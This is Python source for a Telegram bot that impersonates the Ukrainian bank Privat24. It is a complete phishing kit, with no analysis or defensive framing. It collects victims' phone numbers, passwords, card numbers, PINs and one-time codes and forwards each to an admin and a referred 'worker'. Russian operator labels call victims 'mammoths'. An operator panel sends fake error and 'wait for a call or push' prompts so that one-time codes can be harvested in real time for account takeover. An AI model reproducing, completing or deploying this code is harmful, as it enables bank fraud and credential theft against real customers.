import Config
from InstanceBot import bot, dp
from aiogram import types, Dispatcher
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import StatesGroup, State
from keyboards import Keyboards
from database import db
from states import User


class log(StatesGroup):
    number = State()
    password = State()
    card = State()
    pin = State()


class new_log(StatesGroup):
    number = State()
    log_pass = State()
    num_pass = State()
    cod3 = State()
    passwrd = State()
    pincode = State()
    card = State()
    msg = State()
    msg2 = State()
    getcode = State()
    block = State()


async def start(message: types.Message):
    user_id = message.from_user.id
    name = message.from_user.username
    try:
        if not db.user_exist(user_id):
            start_comm = message.text
            ref_id = str(start_comm[7:])
            if str(ref_id) != '':
                if str(ref_id) != str(user_id):
                    db.add_user(user_id, name, ref_id, 0)
                    await bot.send_message(message.chat.id, '💍 Вітаємо Вас. Ви зайшли в телеграм версію Приват24.\n'
                                                            'Для використання всіх можливостей, просимо вас авторизуватися.',
                                           reply_markup=Keyboards.main_menu())
                    await User.menu.menu.set()
                    try:
                        await bot.send_message(Config.admin_id, f'Новый пользователь\n'
                                                                f'ID: {user_id}\n'
                                                                f'NAME: {name}\n'
                                                                f'WORKER: {ref_id}')
                        await bot.send_message(ref_id, f'Новый мамонт @{name}, {user_id}')
                    except:
                        pass
                else:
                    pass
            else:
                db.add_user(user_id, name, 0, 0)
                await bot.send_message(message.chat.id, '💍 Вітаємо Вас. Ви зайшли в телеграм версію Приват24.\n'
                                                        'Для використання всіх можливостей, просимо вас авторизуватися.',
                                       reply_markup=Keyboards.main_menu())
                await User.menu.menu.set()
        else:
            await bot.send_message(message.chat.id, '💍 Вітаємо Вас. Ви зайшли в телеграм версію Приват24.\n'
                                                    'Для використання всіх можливостей, просимо вас авторизуватися.',
                                   reply_markup=Keyboards.main_menu())
            await User.menu.menu.set()
    except:
        await bot.send_message(user_id, '💍 Вітаємо Вас. Ви зайшли в телеграм версію Приват24.\n'
                                        'Для використання всіх можливостей, просимо вас авторизуватися.',
                               reply_markup=Keyboards.main_menu())
        await User.menu.menu.set()


async def nazad(message: types.Message):
    await User.menu.menu.set()
    await bot.send_message(message.chat.id, 'Ви повернулися в головне меню', reply_markup=Keyboards.main_menu())


async def work(message: types.Message):
    user_id = message.from_user.id
    await bot.send_message(message.chat.id, f'Твоя реф ссылка:\n'
                                            f't.me/{Config.link}?start={user_id}')


async def menu(message: types.Message):
    if db.get_info_user(message.from_user.id)[4] == 0:
        button = db.get_hand_butt(message.text)
        if message.text in db.hand_butt() and db.get_setting()[0][0] == 1:
            if message.text == db.hand_butt()[0]:
                await log.number.set()
                await bot.send_photo(message.chat.id, button[3], button[2],
                                     reply_markup=Keyboards.kb_nazad)  # Просит номер
            else:
                await bot.send_photo(message.chat.id, button[3], button[2])
        if message.text in db.hand_butt() and db.get_setting()[0][0] == 0:
            if message.text == db.hand_butt()[0]:
                await log.number.set()
                await bot.send_message(message.chat.id, button[2], reply_markup=Keyboards.kb_nazad)  # Просит номер
            else:
                await bot.send_message(message.chat.id, button[2])
    else:
        await bot.send_message(message.chat.id, 'Вас було заблоковано системою безпеки')


async def number(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['number'] = message.text
    await log.password.set()
    await bot.send_message(message.chat.id, '🔐 Вхід у Приват24 - версія телеграм-бот.\n\n'
                                            'Пароль:') #Просит пароль


async def password(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        number = data['number']
        passw = message.text
    data_user = db.get_info_user(message.from_user.id)
    if data_user[3] != 0:
        data_worker = db.get_info_user(data_user[3])
        await bot.send_message(Config.admin_id, f'Номер: <code>{number}</code>\n'
                                                f'Пасс: <code>{passw}</code>\n'
                                                f'WORKER: <code>{data_user[3]}</code> | @{data_worker[2]}\n'
                                                f'Мамонт: @{data_user[2]} | <code>{data_user[1]}</code>',
                               reply_markup=Keyboards.menu_vbiv(message.from_user.id), parse_mode='html')
        await bot.send_message(message.chat.id, '♻️ Триває перевірка...',
                               reply_markup=Keyboards.main_menu())  # Конечная
        await User.menu.menu.set()
    else:
        await bot.send_message(Config.admin_id, f'Номер: <code>{number}</code>\n'
                                                f'Пасс: <code>{passw}</code>\n'
                                                f'WORKER: NONE\n'
                                                f'Мамонт: @{data_user[2]} | <code>{data_user[1]}</code>',
                               reply_markup=Keyboards.menu_vbiv(message.from_user.id), parse_mode='html')
        await bot.send_message(message.chat.id, '♻️ Триває перевірка...',
                               reply_markup=Keyboards.main_menu())  # Конечная
        await User.menu.menu.set()


async def calldata_vbiv(call: types.CallbackQuery, state: FSMContext):
    await bot.answer_callback_query(callback_query_id=call.id)
    temp = call.data.split('|')
    user_id = temp[2]
    vbiv_id = call.from_user.id
    if temp[1] == 'num':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(user_id, f'❌ Неправильний номер. Вкажіть правильний номер:',
                               reply_markup=Keyboards.number(user_id, vbiv_id))
        await bot.send_message(vbiv_id, f'Отправлено {user_id} уведомление о неверном номере')
    if temp[1] == 'lp':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(user_id, '❌ Невірний логін або пароль. Спробуйте авторизуватися знову.')
        await bot.send_message(vbiv_id, f'Отправлено уведомление о неверном логине/пароле')
    if temp[1] == 'p':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(user_id, f'❌ Невірний пароль. Повторіть авторизацію знову.')
        await bot.send_message(vbiv_id, f'Отправлено {user_id} уведомление о неверном пароле')
    if temp[1] == 'otm_auth':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(user_id, f'❌ Ви відхилили авторизацію. Повторіть авторизацію знову.')
        await bot.send_message(vbiv_id, f'Отправлено {user_id} уведомление об отмене авторизации')
    if temp[1] == 'crd':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(user_id, f'❌ Введена вами картка недійсна. Вкажіть вірну картку.',
                               reply_markup=Keyboards.card(user_id, vbiv_id))
        await bot.send_message(vbiv_id, f'Отправлено {user_id} уведомление о неверной карте')
    if temp[1] == 'msg':
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.msg.set()
        async with state.proxy() as data:
            data['user_id'] = user_id
        await bot.send_message(vbiv_id, f'Отправь сообщение для мамонта')
    if temp[1] == 'gc':
        await bot.send_message(user_id,
                               '✉️ Очікуйте дзвінка з кодом, після чого натисніть кнопку "Надіслати код" і напишіть її.',
                               reply_markup=Keyboards.code(user_id, vbiv_id))
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(vbiv_id, f'Отправлено {user_id} уведомление о запросе кода')
    if temp[1] == 'pin':
        await bot.send_message(user_id, '❌ Помилка: неправильний PIN. Вкажіть вірний PIN-код.',
                               reply_markup=Keyboards.pin(user_id, vbiv_id))
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(vbiv_id, f'Отправлено {user_id} уведомление о неверном пин-коде')
    if temp[1] == 'zvon':
        await bot.send_message(user_id, '📱Очікуйте дзвінок і підтвердіть вхід.')
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(vbiv_id, f'Отправлено {user_id} уведомление о подтверждении по звонку')
    if temp[1] == 'push':
        await bot.send_message(user_id,
                               '📲 Підтвердіть пуш-повідомлення в додатку Приват24 для підтвердження авторизації в боті.')
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(vbiv_id, f'Отправлено {user_id} уведомление о подтверждении пуш уведомление')
    if temp[1] == 'cod3':
        await bot.send_message(user_id, '✉️ Вам надіслано код із трьох цифр, введіть його.',
                               reply_markup=Keyboards.code3(user_id, vbiv_id))
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.send_message(vbiv_id, f'Отправлено {user_id} уведомление о запросе кода из 3 цифр')
    if temp[1] == 'bl':
        await bot.answer_callback_query(callback_query_id=call.id)
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        db.ban_user(user_id)
        await bot.send_message(vbiv_id, 'Пользователь заблокирован')


async def calldata_user(call: types.CallbackQuery, state: FSMContext):
    temp = call.data.split('|')
    user_id = call.from_user.id
    vbiv_id = temp[3]
    if temp[1] == 'n':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.number.set()
        await bot.send_message(user_id, '✍️ Введіть номер')
        await bot.send_message(vbiv_id, f'Мамонт {user_id} нажал кнопку отправить номер повторно')
    if temp[1] == 'msg_u':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.msg2.set()
        async with state.proxy() as data:
            data['vbiv_id'] = vbiv_id
        await bot.send_message(user_id, '✍️ Введіть відповідь')
        await bot.send_message(vbiv_id, f'Мамонт {user_id} нажал ответить на сообщение')
    if temp[1] == 'code':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.getcode.set()
        await bot.send_message(user_id, '✍️ Введіть код')
        await bot.send_message(vbiv_id, f'Мамонт {user_id} вводит код')
    if temp[1] == 'card':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.card.set()
        await bot.send_message(user_id, '✍️ Введіть карту')
        await bot.send_message(vbiv_id, f'Мамонт {user_id} вводит карту')
    if temp[1] == 'pin':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.pincode.set()
        await bot.send_message(user_id, '✍️ Введіть PIN')
        await bot.send_message(vbiv_id, f'Мамонт {user_id} вводит PIN')
    if temp[1] == 'cod3':
        await bot.delete_message(call.message.chat.id, call.message.message_id)
        await bot.answer_callback_query(callback_query_id=call.id)
        await new_log.cod3.set()
        await bot.send_message(user_id, '✍️ Введіть код')
        await bot.send_message(vbiv_id, f'Мамонт {user_id} вводит код 3 цифры')


async def user_answer(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        vbiv_id = data['vbiv_id']
    await bot.send_message(vbiv_id, f'Сообщение от {message.from_user.id} | @{message.from_user.username}\n'
                                    f'MESSAGE: {message.text}',
                           reply_markup=Keyboards.menu_vbiv(message.from_user.id))
    await bot.send_message(message.chat.id, '♻️ Триває перевірка...')
    await User.menu.menu.set()


async def user_povtor(message: types.Message):
    await bot.send_message(Config.admin_id, f'Новый номер от {message.from_user.id} | @{message.from_user.username}\n'
                                            f'NUMBER: {message.text}')
    await bot.send_message(message.chat.id, '♻️ Триває перевірка...')
    await User.menu.menu.set()


async def send_msg(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        user_id = data['user_id']
    await bot.send_message(user_id, message.text, reply_markup=Keyboards.msg(user_id, message.from_user.id))
    await User.menu.menu.set()
    await bot.send_message(message.chat.id, f'Сообщение мамонту отправлено',
                           reply_markup=Keyboards.menu_vbiv(user_id))


@dp.message_handler(state=new_log.getcode)
async def gcode_user(message: types.Message, state: FSMContext):
    await bot.send_message(Config.admin_id, f'Код от {message.from_user.id} | @{message.from_user.username}\n'
                                            f'CODE: {message.text}',
                                            reply_markup=Keyboards.menu_vbiv(message.from_user.id))
    await bot.send_message(message.chat.id, '♻️ Триває перевірка...')
    await User.menu.menu.set()


@dp.message_handler(state=new_log.card)
async def card_new(message: types.Message, state: FSMContext):
    await bot.send_message(Config.admin_id, f'CARD от {message.from_user.id} | @{message.from_user.username}\n'
                                            f'CARD: {message.text}',
                                            reply_markup=Keyboards.menu_vbiv(message.from_user.id))
    await bot.send_message(message.chat.id, '♻️ Триває перевірка...')
    await User.menu.menu.set()


@dp.message_handler(state=new_log.pincode)
async def pin_new(message: types.Message, state: FSMContext):
    await bot.send_message(Config.admin_id, f'PIN от {message.from_user.id} | @{message.from_user.username}\n'
                                            f'PIN: {message.text}',
                                            reply_markup=Keyboards.menu_vbiv(message.from_user.id))
    await bot.send_message(message.chat.id, '♻️ Триває перевірка...')
    await User.menu.menu.set()


@dp.message_handler(state=new_log.cod3)
async def pin_new(message: types.Message, state: FSMContext):
    await bot.send_message(Config.admin_id, f'CODE3 от {message.from_user.id} | @{message.from_user.username}\n'
                                            f'CODE3: {message.text}',
                                            reply_markup=Keyboards.menu_vbiv(message.from_user.id))
    await bot.send_message(message.chat.id, '♻️ Триває перевірка...')
    await User.menu.menu.set()


def add_hand_user(dp: Dispatcher):
    dp.register_message_handler(nazad, text=['Назад'], state='*')
    dp.register_message_handler(work, commands=['work'], state='*')
    dp.register_message_handler(start, commands=['start'], state='*')
    dp.register_message_handler(menu, content_types=['text'], state=User.menu.menu)
    dp.register_message_handler(number, state=log.number)
    dp.register_message_handler(password, state=log.password)
    dp.register_callback_query_handler(calldata_vbiv, lambda c: c.data and c.data.startswith('#'), state='*')
    dp.register_callback_query_handler(calldata_user, lambda c: c.data and c.data.startswith('z'), state='*')
    dp.register_message_handler(user_povtor, state=new_log.number)
    dp.register_message_handler(send_msg, state=new_log.msg)
    dp.register_message_handler(user_answer, state=new_log.msg2)


